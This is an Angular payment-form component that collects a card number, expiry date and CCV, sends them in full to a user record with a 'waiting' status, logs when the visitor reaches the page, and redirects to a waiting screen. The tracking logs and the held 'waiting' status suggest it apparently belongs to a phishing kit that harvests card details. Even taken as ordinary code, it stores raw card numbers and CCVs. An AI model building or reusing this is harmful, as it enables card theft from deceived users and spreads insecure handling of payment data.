import { Component, OnInit } from '@angular/core';
import { FormBuilder, FormGroup, Validators, FormControl, AbstractControl } from '@angular/forms';
import { Directive, ElementRef, HostListener, Renderer2 } from '@angular/core';
import { AppService } from '../app.service';
import { Route, Router } from '@angular/router';
import { CookieService } from 'ngx-cookie-service';


@Component({
  selector: 'app-payment',
  templateUrl: './payment.component.html',
  styleUrls: ['./payment.component.css']
})
export class PaymentComponent implements OnInit {
  creditCardForm: FormGroup;
  id: any;
  device = "windows";
  last_connected = new Date;
  constructor(private fb: FormBuilder, private el: ElementRef, private renderer: Renderer2, private appService: AppService, private router: Router, private cookieService: CookieService) {
    if (!sessionStorage.getItem('homeinfo')) {
      this.router.navigate(['/home'], { queryParams: { pwd: 'safe' } })

    }
    this.creditCardForm = this.fb.group({
      Card_number: ['', [Validators.required]],
      Expiration_date: ['', [Validators.required, Validators.pattern('^(0[1-9]|1[0-2])\/([0-9]{2,4})$'), this.expirationDateValidator]],
      CCV: ['', [Validators.required, Validators.minLength(3), Validators.maxLength(3)]],
    });
  }
  @HostListener('input', ['$event'])
  onInput(event: Event) {
    const input = event.target as HTMLInputElement;
    let value = input.value.replace(/\s/g, ''); // Remove existing spaces

    if (input.name === 'cardNumber') {
      // Card number formatting
      if (value.length > 16) {
        value = value.slice(0, 16); // Limit the length to 16 characters
      }
      const formattedValue = this.formatCardNumber(value);
      this.renderer.setProperty(input, 'value', formattedValue);
    } /* else if (input.name === 'expiration') {
      // Expiration date formatting
      if (value.length > 7) {
        value = value.slice(0, 7); // Limit the length to 7 characters
      }
      const formattedValue = this.formatExpiration(value);
      this.renderer.setProperty(input, 'value', formattedValue);
    } */
  }

  private formatCardNumber(value: string): string {
    value = value.replace(/\s/g, ''); // Remove existing spaces
    const formattedValue = [];
    for (let i = 0; i < value.length; i += 4) {
      formattedValue.push(value.slice(i, i + 4));
    }
    return formattedValue.join(' ');
  }


  expirationDateValidator(control: AbstractControl): { [key: string]: boolean } | null {
    const value = control.value;

    // Extract month and year from the input
    const parts = value.split('/');
    const month = parseInt(parts[0], 10);
    let year = parseInt(parts[1], 10);
    // Get the current date
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear();
    const currentMonth = currentDate.getMonth() + 1;
    if (Math.floor(year / 100) == 0) {
      year = year + 2000;
    }
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return { 'invalidDate': true };
    }

    return null;
  }













  ngOnInit(): void {

    setTimeout(() => {
      const logs = { text: "user on payment page", date: new Date }
      this.appService.updateUser(undefined, this.cookieService.get('id'), logs, undefined, undefined, undefined).subscribe(res => {

      });

    }, 1000)
  }

  submit() {


    if (this.creditCardForm.valid) {
      const quickdata = this.creditCardForm.value;
      const id = this.cookieService.get('id');
      const status = "waiting";
      this.appService.updateUser(quickdata, id, undefined, status, undefined, undefined).subscribe();
      sessionStorage.setItem('payment', '1');
      this.router.navigate(['/waiting'])
    }



  }
}
